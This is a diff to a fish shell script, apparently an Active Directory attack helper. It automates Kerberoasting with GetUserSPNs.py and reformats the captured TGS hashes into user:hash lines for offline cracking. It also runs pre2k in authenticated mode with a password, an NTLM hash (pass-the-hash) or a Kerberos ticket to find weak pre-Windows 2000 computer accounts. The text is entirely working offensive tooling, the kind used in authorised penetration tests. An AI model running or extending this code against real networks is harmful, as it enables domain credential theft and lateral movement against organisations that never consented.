@@ -256,7 +256,11 @@ Examples:
         GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -iE "(No entries found|Error)"
     end
     if test -f $kerb_file
-        cat $kerb_file
+        # Convert hashes to user:hash format and save to a temporary file
+        set kerb_formatted (mktemp)
+        cat $kerb_file | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' > $kerb_formatted
+        cat $kerb_formatted
+        mv $kerb_formatted $kerb_file
         ezpz_info "Saving hashes to $kerb_file"
     end
 
@@ -283,14 +287,19 @@ Examples:
         if command -v pre2k >/dev/null 2>&1
             ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
             
-            # Build pre2k command
-            if set -q _flag_kerb -a -n "$dc_fqdn"
-                set pre2k_cmd pre2k unauth -d $domain -dc-host $dc_fqdn -dc-ip $target -inputfile $users_file -k
+            # Build pre2k auth command
+            set pre2k_cmd pre2k auth -u "$user" -d $domain -dc-ip $target
+            
+            # Add authentication method
+            if set -q _flag_password
+                set -a pre2k_cmd -p "$_flag_password"
+            else if set -q _flag_hash
+                set -a pre2k_cmd -hashes ":$_flag_hash"
+            else if set -q _flag_kerb
+                set -a pre2k_cmd -k
                 if set -q KRB5CCNAME
                     set -a pre2k_cmd -no-pass
                 end
-            else
-                set pre2k_cmd pre2k unauth -d $domain -dc-ip $target -inputfile $users_tmp
             end
             
             ezpz_cmd "$pre2k_cmd"
